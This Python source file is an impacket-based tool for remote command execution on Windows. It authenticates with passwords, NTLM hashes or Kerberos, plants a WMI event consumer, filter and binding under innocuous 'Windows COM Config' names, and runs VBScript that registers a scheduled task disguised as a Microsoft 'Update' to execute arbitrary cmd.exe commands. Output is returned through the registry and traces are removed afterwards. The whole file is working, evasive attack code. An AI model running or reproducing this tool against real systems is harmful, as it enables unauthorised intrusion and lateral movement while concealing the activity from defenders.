#!/usr/bin/env python
# If you want to disable "PropName" debug output, you should comment line 2414 in wmi.py and reinstall it.

from __future__ import division
from __future__ import print_function
import sys
import argparse
import logging
import uuid
import time
import base64

from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket import version
from impacket.dcerpc.v5.dcomrt import DCOMConnection, COMVERSION
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL

class WMIPERSISTENCE:
    def __init__(self, command='' ,username='', password='', domain='', options=None):
        self.__command = command
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__options = options
        self.__lmhash = ''
        self.__nthash = ''
        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')

    @staticmethod
    def checkError(banner, resp):
        call_status = resp.GetCallStatus(0) & 0xffffffff  # interpret as unsigned
        if call_status != 0:
            from impacket.dcerpc.v5.dcom.wmi import WBEMSTATUS
            try:
                error_name = WBEMSTATUS.enumItems(call_status).name
            except ValueError:
                error_name = 'Unknown'
            logging.error('%s - ERROR: %s (0x%08x)' % (banner, error_name, call_status))
        else:
            logging.info('%s - OK' % banner)

    def run(self, addr):
        dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                              options.aesKey, oxidResolver=False, doKerberos=options.k, kdcHost=options.dc_ip)
        generator = GenTemplate(self.__command, self.__options.with_output)
        iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
        iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/subscription', NULL, NULL)
        iWbemLevel1Login.RemRelease()
        vb_script, save_FileName = generator.raw_Template()
        self.create_WMI_Event_Consumer(iWbemServices,vb_script)
        if self.__options.with_output is True:
            vb_writeReg,keyName = generator.write_Reg(save_FileName)
            self.create_WMI_Event_Consumer(iWbemServices,vb_writeReg)
            self.query_CommandResult(iWbemLevel1Login,keyName)
        else:
            pass
        dcom.disconnect()

    def create_WMI_Event_Consumer(self,iWbemServices,vb_script):
        # Auto remove WMI Event Consumer after command executed
        activeScript, _ = iWbemServices.GetObject('ActiveScriptEventConsumer')
        activeScript = activeScript.SpawnInstance()
        activeScript.Name = "Windows COM Config Consumer"
        activeScript.ScriptingEngine = 'VBScript'
        activeScript.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]
        activeScript.ScriptText = vb_script
        self.checkError('Adding ActiveScriptEventConsumer %s'%activeScript.Name, iWbemServices.PutInstance(activeScript.marshalMe()))
        self.setup_EventFilter(iWbemServices)
        self.trigger_ToPwned(iWbemServices)
        #Wait 10 seconds for command completely executed.
        for i in range(5,0,-1):
            print(f"[+] Waiting {i} for command completely executed.", end="\r", flush=True)
            time.sleep(1)
        print("\r\n[+] Command completely executed!")
        # Clean up
        print("[+] Cleaning up custom script")
        self.clean_UpScript(iWbemServices)

    def setup_EventFilter(self, iWbemServices):
        eventFilter, _ = iWbemServices.GetObject('__EventFilter')
        eventFilter = eventFilter.SpawnInstance()
        eventFilter.Name = "Windows COM Config Filter"
        eventFilter.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]
        eventFilter.Query = r"SELECT * FROM __InstanceModificationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
        eventFilter.QueryLanguage = 'WQL'
        eventFilter.EventNamespace = r'root\cimv2'
        self.checkError('Adding EventFilter %s' % eventFilter.Name, iWbemServices.PutInstance(eventFilter.marshalMe()))

    #Trigger FilterToConsumerBinding class to execute cutom script in ActiveScriptEventConsumer just added it.
    def trigger_ToPwned(self, iWbemServices):
        filterBinding, _ = iWbemServices.GetObject('__FilterToConsumerBinding')
        filterBinding = filterBinding.SpawnInstance()
        filterBinding.Filter = '__EventFilter.Name="Windows COM Config Filter"'
        filterBinding.Consumer = 'ActiveScriptEventConsumer.Name="Windows COM Config Consumer"'
        filterBinding.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]
        self.checkError('Adding FilterToConsumerBinding', iWbemServices.PutInstance(filterBinding.marshalMe()))

    def query_CommandResult(self, iWbemLevel1Login ,keyName):
        iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
        descriptor, _ = iWbemServices.GetObject('StdRegProv')
        descriptor = descriptor.SpawnInstance()
        retVal = descriptor.GetStringValue(2147483650,'SOFTWARE\\classes\\hello', keyName)
        print("[+] Get result:")
        result = retVal.sValue
        print(base64.b64decode(result).decode('utf-8'))
        print("[+] Remove registry Key")
        retVal = descriptor.DeleteKey(2147483650,'SOFTWARE\\classes\\hello')
        descriptor.RemRelease()
        iWbemServices.RemRelease()

    def clean_UpScript(self,iWbemServices):
        self.checkError('Removing ActiveScriptEventConsumer Windows COM Config Consumer',
                            iWbemServices.DeleteInstance('ActiveScriptEventConsumer.Name="Windows COM Config Consumer"'))
        self.checkError('Removing EventFilter Windows COM Config Filter',
                            iWbemServices.DeleteInstance('__EventFilter.Name="Windows COM Config Filter"'))
        self.checkError('Removing FilterToConsumerBinding',
                            iWbemServices.DeleteInstance(
                                r'__FilterToConsumerBinding.Consumer="ActiveScriptEventConsumer.Name=\"Windows COM Config Consumer\"",'
                                r'Filter="__EventFilter.Name=\"Windows COM Config Filter\""'))

class GenTemplate:
    def __init__(self,command,options_Output):
        self.command = command
        self.options_With_Output = options_Output

    def raw_Template(self):
        schedule_TaskName = str(uuid.uuid4())
        save_FileName = str(uuid.uuid4()) + ".txt"
        template_PartOne = r"""Const TriggerTypeDaily = 1
Const ActionTypeExec = 0
Set service = CreateObject("Schedule.Service")
Call service.Connect
Dim rootFolder
Set rootFolder = service.GetFolder("\")
Dim taskDefinition
Set taskDefinition = service.NewTask(0)
Dim regInfo
Set regInfo = taskDefinition.RegistrationInfo
regInfo.Description = "Update"
regInfo.Author = "Microsoft"
Dim settings
Set settings = taskDefinition.settings
settings.Enabled = True
settings.StartWhenAvailable = True
settings.Hidden = False
settings.DisallowStartIfOnBatteries = False
Dim triggers
Set triggers = taskDefinition.triggers
Dim trigger
Set trigger = triggers.Create(7)
Dim Action
Set Action = taskDefinition.Actions.Create(ActionTypeExec)
Action.Path = "c:\windows\system32\cmd.exe"
"""
        #template_PartTwo = r'Action.arguments = chr(34) & "/c ' + self.__command + '  > C:\\Windows\\Temp\\' + save_FileName + r'" & chr(34)'
        if self.options_With_Output is True:
            template_PartTwo = r'Action.arguments = chr(34) & "/c ' + self.command + '  > C:\\Windows\\Temp\\' + save_FileName + r'" & chr(34)'
        else:
            save_FileName=''
            template_PartTwo = r'Action.arguments = chr(34) & "/c ' + self.command + r'" & chr(34)'
        
        template_PartThree = r"""
Dim objNet, LoginUser
Set objNet = CreateObject("WScript.Network")
LoginUser = objNet.UserName
    If UCase(LoginUser) = "SYSTEM" Then
    Else
    LoginUser = Empty
    End If
Call rootFolder.RegisterTaskDefinition("ReplaceName", taskDefinition, 6, LoginUser, , 3)
Call rootFolder.DeleteTask("ReplaceName",0)"""
        template_PartThree = template_PartThree.replace("ReplaceName",schedule_TaskName)
        template = template_PartOne + template_PartTwo + template_PartThree
        return template,save_FileName

    def write_Reg(self,save_FileName):
        regKeyName = str(uuid.uuid4())
        template_PartOne = r"""set ws=createobject("wscript.shell")
set fs = createobject("scripting.filesystemobject")
"""
        template_PartTwo = 'set ts = fs.opentextfile("C:\\Windows\\Temp\\' + save_FileName + r'",1)'
        template_PartThree = r"""
content= ts.readall
ts.close
b64_content = Base64Encode(content, false)
path="HKEY_LOCAL_MACHINE\SOFTWARE\Classes\hello\"
"""
        template_PartFour = r'val=ws.regwrite(path&"' + regKeyName + '",b64_content)'
        template_PartFive = r"""
Function Base64Encode(ByVal sText, ByVal fAsUtf16LE)
    With CreateObject("Msxml2.DOMDocument").CreateElement("aux")
        .DataType = "bin.base64"
        if fAsUtf16LE then
            .NodeTypedValue = StrToBytes(sText, "utf-16le", 2)
        else
            .NodeTypedValue = StrToBytes(sText, "utf-8", 3)
        end if
        Base64Encode = .Text
    End With
End Function
function StrToBytes(ByVal sText, ByVal sTextEncoding, ByVal iBomByteCount)
    With CreateObject("ADODB.Stream")
        .Type = 2
        .Charset = sTextEncoding
        .Open
        .WriteText sText

        .Position = 0
        .Type = 1
        .Position = iBomByteCount
        StrToBytes = .Read
        .Close
    End With
end function"""
        template = template_PartOne + template_PartTwo + template_PartThree + template_PartFour + template_PartFive
        return(template,regKeyName)

# Process command-line arguments.
if __name__ == '__main__':
    # Init the example's logger theme
    logger.init()
    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help = True, description = "Creates/Removes a WMI Event Consumer/Filter and "
                               "link between both to execute Visual Basic based on the WQL filter or timer specified.")

    parser.add_argument('target', action='store', help='[domain/][username[:password]@]<address>')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-com-version', action='store', metavar = "MAJOR_VERSION:MINOR_VERSION", help='DCOM version, '
                        'format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7')
    parser.add_argument('command', nargs='*', default=' ', help='command that you want to execute.')
    parser.add_argument('-with-output', action='store_true', help='Execute command with output')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                       'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                       'ommited it use the domain part (FQDN) specified in the target parameter')
 
    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    if options.com_version is not None:
        try:
            major_version, minor_version = options.com_version.split('.')
            COMVERSION.set_default_version(int(major_version), int(minor_version))
        except Exception:
            logging.error("Wrong COMVERSION format, use dot separated integers e.g. \"5.7\"")
            sys.exit(1)
    
    domain, username, password, address = parse_target(options.target)

    try:
        if domain is None:
            domain = ''

        if options.aesKey is not None:
            options.k = True

        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass
            password = getpass("Password:")

        executer = WMIPERSISTENCE(' '.join(options.command), username, password, domain, options)
        executer.run(address)

    except (Exception, KeyboardInterrupt) as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(e)
    sys.exit(0)
